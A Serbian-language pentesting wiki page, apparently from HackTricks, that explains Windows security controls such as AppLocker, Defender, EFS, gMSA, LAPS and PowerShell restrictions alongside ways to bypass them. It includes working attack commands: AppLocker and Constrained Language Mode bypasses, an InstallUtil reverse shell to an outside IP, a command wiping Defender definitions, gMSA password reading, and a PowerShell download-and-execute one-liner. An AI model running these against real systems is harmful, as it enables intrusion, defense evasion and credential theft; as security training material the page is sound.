# Windows Security Controls

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker Politika

Lista odobrenih softverskih aplikacija ili izvršnih datoteka koje su dozvoljene da budu prisutne i pokrenute na sistemu naziva se bela lista aplikacija. Cilj je zaštita okruženja od štetnog malvera i neodobrenog softvera koji se ne poklapa sa specifičnim poslovnim potrebama organizacije.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) je Microsoft-ovo **rešenje za belu listu aplikacija** i daje sistem administratorima kontrolu nad **kojim aplikacijama i datotekama korisnici mogu da pokrenu**. Pruža **detaljnu kontrolu** nad izvršnim datotekama, skriptama, Windows instalacionim datotekama, DLL-ovima, upakovanim aplikacijama i upakovanim instalaterima aplikacija.\
Često je za organizacije **blokirati cmd.exe i PowerShell.exe** i pristup pisanju određenim direktorijumima, **ali sve to može biti zaobiđeno**.

### Provera

Proverite koje datoteke/ekstenzije su na crnoj/beloj listi:

```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Ovaj putanja registra sadrži konfiguracije i politike primenjene od strane AppLockera, pružajući način da pregledate trenutni skup pravila koja se primenjuju na sistemu:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Zaobilazak

* Korisne **Folderi za pisanje** za zaobilazak AppLocker politike: Ako AppLocker dozvoljava izvršavanje bilo čega unutar `C:\Windows\System32` ili `C:\Windows`, postoje **folderi za pisanje** koje možete koristiti da **zaobiđete ovo**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

* Često **povereni** [**"LOLBAS's"**](https://lolbas-project.github.io/) binarni fajlovi mogu biti korisni za zaobilaženje AppLockera.
* **Loše napisana pravila takođe mogu biti zaobiđena**
* Na primer, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, možete kreirati **folder nazvan `allowed`** bilo gde i biće dozvoljen.
* Organizacije često takođe fokusiraju na **blokiranje izvršnog fajla `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ali zaboravljaju na **druge** [**lokacije izvršnih fajlova PowerShell-a**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) kao što su `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ili `PowerShell_ISE.exe`.
* **DLL sprovođenje veoma retko je omogućeno** zbog dodatnog opterećenja koje može staviti na sistem i količine testiranja potrebne da se osigura da ništa neće biti oštećeno. Stoga korišćenje **DLL-ova kao tajnih prolaza pomoći će u zaobilaženju AppLockera**.
* Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **izvršite Powershell** kod u bilo kom procesu i zaobiđete AppLocker. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Skladištenje akreditiva

### Menadžer sigurnosnih naloga (SAM)

Lokalni akreditivi prisutni su u ovom fajlu, lozinke su heširane.

### Lokalna sigurnosna autoriteta (LSA) - LSASS

**Akreditivi** (heširani) su **sačuvani** u **memoriji** ovog podsistema iz razloga jednostavnog prijavljivanja.\
**LSA** upravlja lokalnom **sigurnosnom politikom** (politika lozinke, dozvole korisnika...), **autentifikacijom**, **pristupnim tokenima**...\
LSA će biti ta koja će **proveriti** pružene akreditive unutar fajla **SAM** (za lokalnu prijavu) i **komunicirati** sa **kontrolorom domena** da autentifikuje korisnika domena.

**Akreditivi** su **sačuvani** unutar **procesa LSASS**: Kerberos tiketi, heševi NT i LM, lako dešifrovane lozinke.

### LSA tajne

LSA može sačuvati na disku neke akreditive:

* Lozinka računa računara Active Directory (nedostupan kontrolor domena).
* Lozinke naloga Windows servisa
* Lozinke za zakazane zadatke
* Više (lozinka IIS aplikacija...)

### NTDS.dit

To je baza podataka Active Directory-ja. Prisutna je samo na kontrolorima domena.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) je antivirus koji je dostupan u Windows 10 i Windows 11, kao i u verzijama Windows Servera. On **blokira** česte alate za pentesting kao što je **`WinPEAS`**. Međutim, postoje načini da se **zaobiđu ove zaštite**.

### Provera

Da biste proverili **status** **Defendera** možete izvršiti PS cmdlet **`Get-MpComputerStatus`** (proverite vrednost **`RealTimeProtectionEnabled`** da biste znali da li je aktivan):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Za enumeraciju takođe možete pokrenuti:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Enkriptovan sistem datoteka (EFS)

EFS obezbeđuje sigurnost datoteka putem enkripcije, koristeći **simetrični ključ** poznat kao **Ključ enkripcije datoteke (FEK)**. Ovaj ključ je enkriptovan korisnikovim **javni ključem** i čuva se unutar alternativnog podatkovnog toka $EFS enkriptovane datoteke. Kada je potrebno dešifrovati, odgovarajući **privatni ključ** korisnikovog digitalnog sertifikata se koristi za dešifrovanje FEK-a iz $EFS toka. Više detalja možete pronaći [ovde](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

**Scenariji dešifrovanja bez inicijacije korisnika** uključuju:

* Kada se datoteke ili fascikle prebace na ne-EFS sistem datoteka, poput [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), automatski se dešifruju.
* Enkriptovane datoteke poslate preko mreže putem SMB/CIFS protokola se dešifruju pre slanja.

Ovaj metod enkripcije omogućava **transparentan pristup** enkriptovanim datotekama vlasniku. Međutim, jednostavna promena lozinke vlasnika i prijava neće dozvoliti dešifrovanje.

**Ključne tačke**:

* EFS koristi simetrični FEK, enkriptovan korisnikovim javnim ključem.
* Dešifrovanje koristi korisnikov privatni ključ za pristup FEK-u.
* Automatsko dešifrovanje se dešava pod određenim uslovima, poput kopiranja na FAT32 ili mrežnu transmisiju.
* Enkriptovane datoteke su dostupne vlasniku bez dodatnih koraka.

### Provera informacija o EFS-u

Proverite da li je **korisnik** koristio ovu **uslugu** proverom da li postoji ovaj put:`C:\users\<korisničkoime>\appdata\roaming\Microsoft\Protect`

Proverite **ko** ima **pristup** datoteci korišćenjem cipher /c \<datoteka>\
Takođe možete koristiti `cipher /e` i `cipher /d` unutar fascikle da **enkriptujete** i **dešifrujete** sve datoteke

### Dešifrovanje EFS datoteka

#### Bivanje autoritetni sistem

Ovaj način zahteva da **žrtveni korisnik** pokreće **proces** unutar hosta. U tom slučaju, korišćenjem `meterpreter` sesija možete preuzeti token procesa korisnika (`impersonate_token` iz `incognito`). Ili jednostavno možete `migrate` na proces korisnika.

#### Poznavanje korisnikove lozinke

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Grupisani upravljani servisni nalozi (gMSA)

Microsoft je razvio **Grupisane upravljane servisne naloge (gMSA)** kako bi pojednostavio upravljanje servisnim nalozima u IT infrastrukturama. Za razliku od tradicionalnih servisnih naloga koji često imaju podešavanje "**Lozinka nikada ne ističe**" omogućeno, gMSA nude sigurnije i upravljivije rešenje:

* **Automatsko upravljanje lozinkom**: gMSA koriste kompleksnu lozinku od 240 karaktera koja se automatski menja prema domenskoj ili računarskoj politici. Ovaj proces rukovodi Microsoft-ova Key Distribution Service (KDC), eliminišući potrebu za ručnim ažuriranjem lozinke.
* **Poboljšana sigurnost**: Ovi nalozi su imuni na blokade i ne mogu se koristiti za interaktivne prijave, poboljšavajući njihovu sigurnost.
* **Podrška za više hostova**: gMSA mogu biti deljeni preko više hostova, čineći ih idealnim za servise koji se izvršavaju na više servera.
* **Mogućnost zakazanih zadataka**: Za razliku od upravljanih servisnih naloga, gMSA podržavaju pokretanje zakazanih zadataka.
* **Pojednostavljeno upravljanje SPN-om**: Sistem automatski ažurira Service Principal Name (SPN) kada dođe do promena u sAMaccount detaljima računara ili DNS imena, pojednostavljujući upravljanje SPN-om.

Lozinke za gMSA se čuvaju u LDAP svojstvu _**msDS-ManagedPassword**_ i automatski se resetuju svakih 30 dana od strane kontrolora domena (DC). Ova lozinka, enkriptovana podatkovna kugla poznata kao [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), može biti dobijena samo od ovlašćenih administratora i servera na kojima su instalirani gMSA, obezbeđujući sigurno okruženje. Za pristup ovim informacijama, potrebna je obezbeđena veza poput LDAPS-a, ili veza mora biti autentifikovana sa 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../.gitbook/assets/asd1.png)

Možete pročitati ovu lozinku sa [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Pronađite više informacija u ovom postu**](https://cube0x0.github.io/Relaying-for-gMSA/)

Takođe, proverite ovu [web stranicu](https://cube0x0.github.io/Relaying-for-gMSA/) o tome kako izvesti **NTLM relay napad** da biste **pročitali** **šifru** **gMSA**.

## LAPS

**Local Administrator Password Solution (LAPS)**, dostupno za preuzimanje sa [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), omogućava upravljanje lokalnim administratorskim šiframa. Ove šifre, koje su **slučajno generisane**, jedinstvene i **redovno menjane**, čuvaju se centralno u Active Directory-ju. Pristup ovim šiframa je ograničen putem ACL-ova za ovlašćene korisnike. Sa dovoljnim dozvolama, omogućeno je čitanje lokalnih administratorskih šifara.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Režim ograničenog jezika

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **zaključava mnoge od funkcija** potrebnih za efikasnu upotrebu PowerShell-a, kao što su blokiranje COM objekata, dozvoljavanje samo odobrenih .NET tipova, XAML baziranih radnih tokova, PowerShell klasa i više.

### **Provera**

```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Zaobilazak

```powershell
#Easy bypass
Powershell -version 2
```

U trenutnom Windows-u taj Bypass neće raditi, ali možete koristiti [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Da biste ga kompajlirali, možda će vam biti potrebno** **dodati referencu** -> _Pretraži_ -> _Pretraži_ -> dodajte `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **promenite projekat na .Net4.5**.

#### Direktni Bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Obrnuti shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **izvršite Powershell** kod u bilo kom procesu i zaobiđete ograničeni režim. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS Izvršna politika

Podrazumevano je postavljena na **restricted.** Glavni načini zaobiđavanja ove politike:

```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

## Security Support Provider Interface (SSPI)

SSPI je API koji se može koristiti za autentifikaciju korisnika.

SSPI će biti zadužen za pronalaženje odgovarajućeg protokola za dve mašine koje žele da komuniciraju. Preferirana metoda za ovo je Kerberos. Zatim će SSPI pregovarati o tome koji će autentifikacioni protokol biti korišćen, ovi autentifikacioni protokoli se nazivaju Security Support Provider (SSP), nalaze se unutar svake Windows mašine u obliku DLL i obe mašine moraju podržavati isti da bi mogle da komuniciraju.

### Glavni SSP-ovi

* **Kerberos**: Preferirani
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** i **NTLMv2**: Iz razloga kompatibilnosti
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Web serveri i LDAP, lozinka u obliku MD5 heša
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL i TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Koristi se za pregovaranje o protokolu koji će se koristiti (Kerberos ili NTLM, pri čemu je Kerberos podrazumevani)
* %windir%\Windows\System32\lsasrv.dll

#### Pregovaranje može ponuditi nekoliko metoda ili samo jednu.

## UAC - Kontrola korisničkih naloga

[Kontrola korisničkih naloga (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za odobrenje za povišene aktivnosti**.

{% content-ref url="uac-user-account-control.md" %}
[uac-user-account-control.md](uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Naučite hakovanje AWS-a od početnika do stručnjaka sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
